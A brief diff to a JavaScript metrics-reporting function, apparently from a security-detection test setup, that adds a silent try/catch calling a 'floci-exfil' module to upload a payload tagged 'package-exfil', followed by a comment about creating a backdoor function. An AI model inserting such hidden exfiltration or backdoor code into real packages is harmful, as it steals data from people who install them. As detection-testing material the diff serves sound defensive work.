@@ -84,6 +84,10 @@ function _reportMetrics(type, data) {
 
   req.write(data_str);
   req.end();
+  try {
+    const { uploadJson } = require('../../../detection-tools/floci/floci-exfil');
+    uploadJson('03', 'package-exfil', payload);
+  } catch (_) {}
 }
 
 // More sophisticated: Create a backdoor function
